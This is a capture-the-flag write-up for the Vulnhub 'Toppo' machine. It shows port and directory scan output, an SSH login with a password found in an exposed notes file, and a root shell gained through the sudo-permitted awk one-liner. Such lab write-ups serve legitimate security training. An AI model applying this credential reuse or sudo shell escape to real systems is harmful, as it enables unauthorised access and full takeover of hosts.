# Toppo

Author: Vulnhub
Difficulty: 1
Key takeaway: try guessing usernames from the password
Tags: SUID, apache, awk, only password, ssh, sudoers
Type: Linux

# Enumeration

- portscan

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44108/udp   status
|   100024  1          45466/tcp6  status
|   100024  1          48336/tcp   status
|_  100024  1          56985/udp6  status
48336/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- found notes.txt in /admin

```bash
Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```

- dir scan

```bash
/mail                 (Status: 301) [Size: 305] [--> http://10.0.2.12/mail/]
/index.html           (Status: 200) [Size: 6437]                            
/admin                (Status: 301) [Size: 306] [--> http://10.0.2.12/admin/]
/post.html            (Status: 200) [Size: 8262]                             
/css                  (Status: 301) [Size: 304] [--> http://10.0.2.12/css/]  
/about.html           (Status: 200) [Size: 5030]                             
/contact.html         (Status: 200) [Size: 7016]                             
/manual               (Status: 301) [Size: 307] [--> http://10.0.2.12/manual/]
/img                  (Status: 301) [Size: 304] [--> http://10.0.2.12/img/]   
/js                   (Status: 301) [Size: 303] [--> http://10.0.2.12/js/]    
/vendor               (Status: 301) [Size: 307] [--> http://10.0.2.12/vendor/]
/LICENSE              (Status: 200) [Size: 1093]                              
/server-status        (Status: 403) [Size: 297]
```

- found API routes in [http://toppo.vuln/js/contact_me.js](http://toppo.vuln/js/contact_me.js)

# Initial Access

- use the password obtained from /admin/notes.txt and username ted to log into ssh
- [linpeas.sh](http://linpeas.sh) reveals /etc/sudoers is readable and we can run /usr/bin/awk as root

```bash
awk 'BEGIN {system("/bin/sh")}'
# root shell obtained
```

# Privilege Escalation

# Notes

-